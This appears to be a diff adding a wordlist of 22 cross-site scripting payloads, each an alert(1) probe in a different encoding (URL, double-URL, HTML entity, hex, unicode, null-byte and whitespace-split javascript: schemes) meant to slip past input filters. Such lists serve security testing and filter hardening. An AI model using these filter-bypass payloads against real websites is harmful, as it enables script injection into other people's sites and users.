@@ -1,0 +1,22 @@
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+%3Csvg%20onload%3Dalert(1)%3E
+%253Cscript%253Ealert(1)%253C/script%253E
+%253Csvg%2520onload%253Dalert(1)%253E
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+\x3cscript\x3ealert(1)\x3c/script\x3e
+\u003cscript\u003ealert(1)\u003c/script\u003e
+<scr%00ipt>alert(1)</scr%00ipt>
+<script>alert(1)//
+<script>alert(1)<!--
+<script>alert`1`</script>
+<img src=x onerror=alert%281%29>
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
+<svg onload=&#97;&#108;&#101;&#114;&#116;(1)>
+jaVasCript:alert(1)
+jav%0aascript:alert(1)
+jav%09ascript:alert(1)
+jav%0dascript:alert(1)
+java%00script:alert(1)
